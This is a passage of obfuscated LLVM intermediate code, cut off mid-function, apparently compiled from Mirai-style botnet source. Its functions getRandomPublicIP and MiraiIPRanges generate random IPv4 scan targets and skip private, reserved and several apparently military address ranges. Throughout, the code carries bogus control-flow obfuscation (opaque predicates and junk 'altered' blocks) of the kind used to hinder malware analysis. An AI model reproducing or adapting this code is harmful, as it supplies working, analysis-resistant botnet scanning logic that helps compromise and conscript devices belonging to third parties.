  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %306

; <label>:306:                                    ; preds = %originalBBpart262, %282, %270, %originalBBpart254, %222, %198, %174, %originalBBpart242, %134, %106, %82, %originalBBpart230, %originalBBpart226, %30
  %307 = phi i1 [ true, %282 ], [ true, %270 ], [ true, %originalBBpart254 ], [ true, %222 ], [ true, %198 ], [ true, %174 ], [ true, %originalBBpart242 ], [ true, %134 ], [ true, %106 ], [ true, %82 ], [ true, %originalBBpart230 ], [ true, %originalBBpart226 ], [ true, %30 ], [ %297, %originalBBpart262 ]
  br i1 %307, label %308, label %321

; <label>:308:                                    ; preds = %306
  %309 = call i32 @rand() #5
  %310 = srem i32 %309, 223
  %311 = trunc i32 %310 to i8
  store i8 %311, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %312 = call i32 @rand() #5
  %313 = srem i32 %312, 255
  %314 = trunc i32 %313 to i8
  store i8 %314, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %315 = call i32 @rand() #5
  %316 = srem i32 %315, 255
  %317 = trunc i32 %316 to i8
  store i8 %317, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %318 = call i32 @rand() #5
  %319 = srem i32 %318, 255
  %320 = trunc i32 %319 to i8
  store i8 %320, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %30

; <label>:321:                                    ; preds = %306
  %322 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 16, i32 16, i1 false)
  %323 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %324 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %325 = zext i8 %324 to i32
  %326 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %327 = zext i8 %326 to i32
  %328 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %329 = zext i8 %328 to i32
  %330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  %331 = zext i8 %330 to i32
  %332 = call i32 (i8*, i8*, ...) @szprintf(i8* %323, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.487, i32 0, i32 0), i32 %325, i32 %327, i32 %329, i32 %331)
  %333 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %334 = call i32 @inet_addr(i8* %333) #5
  ret i32 %334

originalBBalteredBB:                              ; preds = %originalBB, %0
  %335 = alloca [16 x i8], align 16
  %336 = call i32 @rand() #5
  %_ = shl i32 %336, 223
  %_1 = sub i32 0, %336
  %gen = add i32 %_1, 223
  %_2 = sub i32 %336, 223
  %gen3 = mul i32 %_2, 223
  %_4 = sub i32 0, %336
  %gen5 = add i32 %_4, 223
  %337 = srem i32 %336, 223
  %338 = trunc i32 %337 to i8
  store i8 %338, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %339 = call i32 @rand() #5
  %_6 = sub i32 %339, 255
  %gen7 = mul i32 %_6, 255
  %340 = srem i32 %339, 255
  %341 = trunc i32 %340 to i8
  store i8 %341, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %342 = call i32 @rand() #5
  %_8 = sub i32 %342, 255
  %gen9 = mul i32 %_8, 255
  %_10 = shl i32 %342, 255
  %_11 = sub i32 0, %342
  %gen12 = add i32 %_11, 255
  %_13 = sub i32 0, %342
  %gen14 = add i32 %_13, 255
  %_15 = sub i32 %342, 255
  %gen16 = mul i32 %_15, 255
  %343 = srem i32 %342, 255
  %344 = trunc i32 %343 to i8
  store i8 %344, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %345 = call i32 @rand() #5
  %_17 = sub i32 %345, 255
  %gen18 = mul i32 %_17, 255
  %_19 = sub i32 %345, 255
  %gen20 = mul i32 %_19, 255
  %_21 = shl i32 %345, 255
  %_22 = sub i32 %345, 255
  %gen23 = mul i32 %_22, 255
  %346 = srem i32 %345, 255
  %347 = trunc i32 %346 to i8
  store i8 %347, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %originalBB

originalBB24alteredBB:                            ; preds = %originalBB24, %34
  %348 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %349 = zext i8 %348 to i32
  %350 = icmp eq i32 %349, 10
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %62
  %351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %352 = zext i8 %351 to i32
  %353 = icmp sle i32 %352, 127
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %86
  %354 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 169
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %110
  %357 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 172
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %146
  %360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 2), align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 2
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %178
  %363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 192
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %202
  %366 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %367 = zext i8 %366 to i32
  %368 = icmp eq i32 %367, 198
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %226
  %369 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 1), align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 19
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %246
  %372 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %373 = zext i8 %372 to i32
  %374 = icmp eq i32 %373, 198
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %286
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @getRandomPublicIP.ipState, i64 0, i64 0), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp sge i32 %376, 224
  br label %originalBB60
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define i32 @MiraiIPRanges() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #5
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #5
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #5
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #5
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %410, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %392, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %392, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %392, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i32, i32* @x.57
  %28 = load i32, i32* @y.58
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 15
  %38 = load i32, i32* @x.57
  %39 = load i32, i32* @y.58
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %392, label %46

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.57
  %48 = load i32, i32* @y.58
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 16
  %58 = load i32, i32* @x.57
  %59 = load i32, i32* @y.58
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %392, label %66

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i32, i32* @x.57
  %68 = load i32, i32* @y.58
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 56
  %78 = load i32, i32* @x.57
  %79 = load i32, i32* @y.58
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %77, label %392, label %86

; <label>:86:                                     ; preds = %originalBBpart28
  %87 = load i32, i32* @x.57
  %88 = load i32, i32* @y.58
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %86
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 10
  %98 = load i32, i32* @x.57
  %99 = load i32, i32* @y.58
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %97, label %392, label %106

; <label>:106:                                    ; preds = %originalBBpart212
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 192
  br i1 %109, label %110, label %130

; <label>:110:                                    ; preds = %106
  %111 = load i32, i32* @x.57
  %112 = load i32, i32* @y.58
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %110
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 168
  %122 = load i32, i32* @x.57
  %123 = load i32, i32* @y.58
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %121, label %392, label %130

; <label>:130:                                    ; preds = %originalBBpart216, %106
  %131 = load i32, i32* @x.57
  %132 = load i32, i32* @y.58
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %130
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 172
  %142 = load i32, i32* @x.57
  %143 = load i32, i32* @y.58
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %141, label %150, label %174

; <label>:150:                                    ; preds = %originalBBpart220
  %151 = load i32, i32* @x.57
  %152 = load i32, i32* @y.58
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %150
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp sge i32 %160, 16
  %162 = load i32, i32* @x.57
  %163 = load i32, i32* @y.58
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %161, label %170, label %174

; <label>:170:                                    ; preds = %originalBBpart224
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp slt i32 %172, 32
  br i1 %173, label %392, label %174

; <label>:174:                                    ; preds = %170, %originalBBpart224, %originalBBpart220
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 100
  br i1 %177, label %178, label %186

; <label>:178:                                    ; preds = %174
  %179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %180 = zext i8 %179 to i32
  %181 = icmp sge i32 %180, 64
  br i1 %181, label %182, label %186

; <label>:182:                                    ; preds = %178
  %183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %184, 127
  br i1 %185, label %392, label %186

; <label>:186:                                    ; preds = %182, %178, %174
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 169
  br i1 %189, label %190, label %194

; <label>:190:                                    ; preds = %186
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp sgt i32 %192, 254
  br i1 %193, label %392, label %194

; <label>:194:                                    ; preds = %190, %186
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 198
  br i1 %197, label %198, label %206

; <label>:198:                                    ; preds = %194
  %199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp sge i32 %200, 18
  br i1 %201, label %202, label %206

; <label>:202:                                    ; preds = %198
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 1), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp slt i32 %204, 20
  br i1 %205, label %392, label %206

; <label>:206:                                    ; preds = %202, %198, %194
  %207 = load i32, i32* @x.57
  %208 = load i32, i32* @y.58
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %206
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 224
  %218 = load i32, i32* @x.57
  %219 = load i32, i32* @y.58
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %217, label %392, label %226

; <label>:226:                                    ; preds = %originalBBpart228
  %227 = load i32, i32* @x.57
  %228 = load i32, i32* @y.58
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %226
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 6
  %238 = load i32, i32* @x.57
  %239 = load i32, i32* @y.58
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %237, label %390, label %246

; <label>:246:                                    ; preds = %originalBBpart232
  %247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 7
  br i1 %249, label %390, label %250

; <label>:250:                                    ; preds = %246
  %251 = load i32, i32* @x.57
  %252 = load i32, i32* @y.58
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %250
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 11
  %262 = load i32, i32* @x.57
  %263 = load i32, i32* @y.58
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %261, label %390, label %270

; <label>:270:                                    ; preds = %originalBBpart236
  %271 = load i32, i32* @x.57
  %272 = load i32, i32* @y.58
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %270
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 21
  %282 = load i32, i32* @x.57
  %283 = load i32, i32* @y.58
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %281, label %390, label %290

; <label>:290:                                    ; preds = %originalBBpart240
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 22
  br i1 %293, label %390, label %294

; <label>:294:                                    ; preds = %290
  %295 = load i32, i32* @x.57
  %296 = load i32, i32* @y.58
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %294
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 26
  %306 = load i32, i32* @x.57
  %307 = load i32, i32* @y.58
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %305, label %390, label %314

; <label>:314:                                    ; preds = %originalBBpart244
  %315 = load i32, i32* @x.57
  %316 = load i32, i32* @y.58
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %314
  %323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 28
  %326 = load i32, i32* @x.57
  %327 = load i32, i32* @y.58
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %325, label %390, label %334

; <label>:334:                                    ; preds = %originalBBpart248
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 29
  br i1 %337, label %390, label %338

; <label>:338:                                    ; preds = %334
  %339 = load i32, i32* @x.57
  %340 = load i32, i32* @y.58
  %341 = sub i32 %339, 1
  %342 = mul i32 %339, %341
  %343 = urem i32 %342, 2
  %344 = icmp eq i32 %343, 0
  %345 = icmp slt i32 %340, 10
  %346 = or i1 %344, %345
  br i1 %346, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %338
  %347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %348 = zext i8 %347 to i32
  %349 = icmp eq i32 %348, 30
  %350 = load i32, i32* @x.57
  %351 = load i32, i32* @y.58
  %352 = sub i32 %350, 1
  %353 = mul i32 %350, %352
  %354 = urem i32 %353, 2
  %355 = icmp eq i32 %354, 0
  %356 = icmp slt i32 %351, 10
  %357 = or i1 %355, %356
  br i1 %357, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %349, label %390, label %358

; <label>:358:                                    ; preds = %originalBBpart252
  %359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 33
  br i1 %361, label %390, label %362

; <label>:362:                                    ; preds = %358
  %363 = load i32, i32* @x.57
  %364 = load i32, i32* @y.58
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %362
  %371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 55
  %374 = load i32, i32* @x.57
  %375 = load i32, i32* @y.58
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %373, label %390, label %382

; <label>:382:                                    ; preds = %originalBBpart256
  %383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 214
  br i1 %385, label %390, label %386

; <label>:386:                                    ; preds = %382
  %387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @MiraiIPRanges.ipState, i64 0, i64 0), align 1
  %388 = zext i8 %387 to i32
  %389 = icmp eq i32 %388, 215
  br label %390

; <label>:390:                                    ; preds = %386, %382, %originalBBpart256, %358, %originalBBpart252, %334, %originalBBpart248, %originalBBpart244, %290, %originalBBpart240, %originalBBpart236, %246, %originalBBpart232
